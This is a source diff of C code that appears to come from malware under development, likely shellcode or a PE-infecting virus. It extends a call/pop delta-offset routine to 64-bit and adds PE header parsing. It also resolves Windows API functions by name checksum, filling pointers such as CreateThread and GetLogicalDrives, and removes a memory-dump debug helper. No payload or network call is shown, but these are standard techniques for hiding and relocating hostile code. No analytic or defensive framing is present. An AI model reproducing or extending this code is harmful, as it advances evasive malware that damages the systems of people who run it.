@@ -2,6 +2,7 @@
 
 int32_t get_delta_offset(void) {
   int32_t offset;
+  if (IS_32_BIT) {
   asm("call .base\n"
       ".base:\n"
       "pop %%edx\n"
@@ -9,11 +10,23 @@ int32_t get_delta_offset(void) {
       "mov %%edx, %0"
       : "=r" (offset)
   );
+  } else {
+      asm("call .base\n"
+      ".base:\n"
+      "pop %%rdx\n"
+      "sub $.base, %%rdx\n"
+      "mov %%edx, %0"
+      : "=r" (offset)
+  );
+  }
+
   return offset;
 }
 
 uint8_t is_pe(void* baseAddr) {
-  return *(uint16_t*)baseAddr == 0x5A4D && get_nt_header(baseAddr)->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC;
+  PRINT_DEBUG("MAGIC is = %X\n", get_nt_header(baseAddr)->OptionalHeader.Magic);
+  return  *(uint16_t*)baseAddr == 0x5A4D &&
+          get_nt_header(baseAddr)->OptionalHeader.Magic == (IS_32_BIT ? IMAGE_NT_OPTIONAL_HDR32_MAGIC : IMAGE_NT_OPTIONAL_HDR64_MAGIC);
 }
 
 uint32_t align_value(uint32_t value, uint32_t alignment) {
@@ -21,7 +34,8 @@ uint32_t align_value(uint32_t value, uint32_t alignment) {
 }
 
 IMAGE_NT_HEADERS* get_nt_header(void* base) {
-  return (IMAGE_NT_HEADERS*) ((uint8_t*)base + *((uint8_t*)base + 0x3C));
+  IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)base;
+  return (IMAGE_NT_HEADERS*) ((uint8_t*)base + dosHdr->e_lfanew);
 }
 
 IMAGE_EXPORT_DIRECTORY* get_export_directory(void* base, IMAGE_NT_HEADERS* ntHdr) {
@@ -34,12 +48,9 @@ void* get_address_by_checksum(IMAGE_EXPORT_DIRECTORY* ed, void* base, uint32_t c
   uint16_t* nameOrdinalsPtr = (uint16_t*) ((uint8_t*)base + ed->AddressOfNameOrdinals);
 
   for(uint32_t i = 0; i < ed->NumberOfNames; i++) {
-    PRINT_DEBUG(">>%s\n", (uint8_t*)base + *namePtr);
-
     if (checksum((const char*) base + *namePtr) == cs) {
       return (void*) ((uint8_t*)base + *(addrPtr + *nameOrdinalsPtr));
     }
-
     namePtr++;
     nameOrdinalsPtr++;
   }
@@ -92,8 +103,6 @@ int fill_addresses(IMAGE_EXPORT_DIRECTORY* ed, void* base, functions_t* function
                             break;
       case CS_CLOSEHANDLE: functions->closeHandle = (fpCloseHandle) base + *(addrPtr + *nameOrdinalsPtr);
                             break;
-      //case CS_COPYMEMORY: functions->copyMemory = (fpCopyMemory*) base + *(addrPtr + *nameOrdinalsPtr);
-      //                      break;
       case CS_CREATETHREAD: functions->createThread = (fpCreateThread) base + *(addrPtr + *nameOrdinalsPtr);
                             break;
       case CS_GETLOGICALDRIVES: functions->getLogicalDrives = (fpGetLogicalDrives) base + *(addrPtr + *nameOrdinalsPtr);
@@ -127,19 +136,4 @@ void memcp(void* src, void* dest, uint32_t size) {
   for(uint32_t i = 0; i < size; i++) {
     ((uint8_t*)dest)[i] = ((uint8_t*)src)[i];
   }
-}
-
-void memdump(uint8_t *start, uint8_t *end) {
-  PRINT_DEBUG("memdump:");
-  uint32_t i = 0;
-  while (start <= end) {
-    if ((uint32_t)i % 16 == 0)
-      PRINT_DEBUG("\n0x%X | ", (unsigned int)start);
-    else if ((uint32_t)i % 8 == 0)
-      PRINT_DEBUG(" ");
-    PRINT_DEBUG("%02X ", (unsigned int)*start);
-    start++;
-    i++;
-  }
-  PRINT_DEBUG("\n");
 }
